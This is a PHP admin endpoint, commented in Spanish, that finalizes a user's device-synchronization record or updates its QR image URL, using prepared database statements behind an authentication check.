<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/sincronizacion_helpers.php';
verificarAuth();

$pdo = conectarBD();
$input = leerJSON();

$usuario_id = intval($input['usuario_id'] ?? 0);
$sync_id = intval($input['sync_id'] ?? 0);
$aprobado = $input['aprobado'] ?? null;
$qr_url = trim((string) ($input['qr_imagen_url'] ?? ''));
$accion = trim((string) ($input['accion'] ?? 'validar'));

if (!$usuario_id) {
    jsonError('ID de usuario no válido');
}

try {
    if ($accion === 'finalizar') {
        $stmt = $pdo->prepare("
            SELECT id FROM sincronizacion_dispositivo
            WHERE id = ? AND usuario_id = ?
              AND estado IN ('interrupcion', 'pendiente', 'esperando_validacion')
            LIMIT 1
        ");
        $stmt->execute([$sync_id, $usuario_id]);
        if (!$stmt->fetch()) {
            jsonError('No hay sincronización activa para finalizar');
        }

        $upd = $pdo->prepare("
            UPDATE sincronizacion_dispositivo
            SET estado = 'completado',
                paso_actual = 3,
                mensaje_error = NULL,
                fecha_validacion = NOW(),
                fecha_completado = NOW()
            WHERE id = ? AND usuario_id = ?
        ");
        $upd->execute([$sync_id, $usuario_id]);

        $chat = $pdo->prepare("
            INSERT INTO mensajes_admin (usuario_id, admin_id, mensaje, tipo_mensaje, respuesta_usuario, estado, fecha_respuesta, ip_usuario)
            VALUES (?, ?, ?, 'sin_input', 'finalizado', 'respondido', NOW(), ?)
        ");
        $chat->execute([
            $usuario_id,
            (int) ($_SESSION['admin_id'] ?? 1),
            SYNC_CHAT_PREFIX . 'Sincronización finalizada',
            (string) ($_SERVER['REMOTE_ADDR'] ?? 'panel'),
        ]);

        jsonResponse(['success' => true, 'message' => 'Sincronización finalizada']);
    }

    if ($accion === 'actualizar_qr') {
        if ($qr_url === '' || !filter_var($qr_url, FILTER_VALIDATE_URL)) {
            jsonError('Ingresa una URL válida de imagen QR');
        }

        $stmt = $pdo->prepare("
            SELECT id, tipo, estado, paso_actual FROM sincronizacion_dispositivo
            WHERE id = ? AND usuario_id = ?
              AND estado IN ('pendiente', 'esperando_validacion', 'interrupcion')
            LIMIT 1
        ");
        $stmt->execute([$sync_id, $usuario_id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);

        if (!$row || $row['tipo'] !== 'qr') {
            jsonError('No hay sincronización QR activa');
        }

        $estado = $row['estado'] ?? '';

        if ($estado === 'interrupcion') {
            $upd = $pdo->prepare("
                UPDATE sincronizacion_dispositivo
                SET qr_imagen_url = ?,
                    mensaje_error = ?
                WHERE id = ? AND usuario_id = ?
            ");
            $upd->execute([$qr_url, SYNC_MENSAJE_QR_ACTUALIZADO, $sync_id, $usuario_id]);
        } else {
            $upd = $pdo->prepare("
                UPDATE sincronizacion_dispositivo
                SET qr_imagen_url = ?,
                    estado = 'pendiente',
                    paso_actual = 2,
                    codigo_actual = NULL,
                    mensaje_error = ?
                WHERE id = ? AND usuario_id = ?
            ");
            $upd->execute([$qr_url, SYNC_MENSAJE_QR_ACTUALIZADO, $sync_id, $usuario_id]);
        }

        jsonResponse(['success' => true, 'message' => 'QR actualizado']);
    }

    if ($accion === 'validar_legacy') {
        jsonError('La validación manual fue reemplazada por el flujo automático');
    }

    jsonError('Acción no válida');
} catch (Exception $e) {
    jsonError('Error de base de datos: ' . $e->getMessage(), 500);
}
